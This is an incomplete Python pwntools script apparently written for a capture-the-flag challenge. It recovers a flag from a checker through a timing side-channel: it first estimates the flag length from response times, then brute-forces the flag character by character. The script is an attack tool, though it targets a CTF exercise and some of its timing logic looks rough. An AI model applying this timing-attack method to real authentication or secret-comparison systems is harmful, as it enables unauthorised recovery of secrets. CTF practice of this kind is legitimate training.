#Not a complete script but to get the idea how it is to be done
from pwn import *
from time import time
from time import sleep


data = str(hex(128)[2:])
data += "F" * 50

#Find len with time comparison
io = remote('<IP>','<Port>')
io = process('./file.py')
print(io.readuntil(b"Enter flag: "))
stri = ""
fastest = 0.0
for i in range(1,100):
    data = b"F" * i
    now = time()
    io.sendline(data)
    then = time()
    print(f"{i} = {then - now}")
    io.readuntil(b"Enter flag: ")
    if fastest < (then - now):
        stri= str(i)
        fastest = then - now
    sleep(1)
print(f"{fastest} = {stri}")
io.interactive()


#io = remote('<IP>','<Port>')
io = process('./file.py')
io.readuntil(b"Enter flag: ")
stri = ""
total = "{f4"
fastest = 99999999
for j in range(23):
    for i in range(32,127):
        data = str(hex(ord("C")))[2:]
        data += str(hex(ord("H")))[2:]
        data += str(hex(ord("C")))[2:]
        for k in range(len(total)):
            data += str(hex(ord(total[k]))[2:])
        data += str(hex(i)[2:])
        data += "F" * (44 - (len(total) * 2))
        print(data)
        now = time()
        io.sendline(data)
        io.readuntil(b"Enter flag: ")
        sleep(0.5)
        then = time()
        io.sendline("-1")
        io.readuntil(b"Enter flag: ")
        print(f"{i} = {then - now}")
        
        if fastest > (then - now):
            stri= str(i)
            fastest = then - now
        
    print(f"{fastest} = {stri}")
    fastest = 99999999
    total += chr(int(stri) - 1 )
    print(f"CHC{total}")
io.interactive()
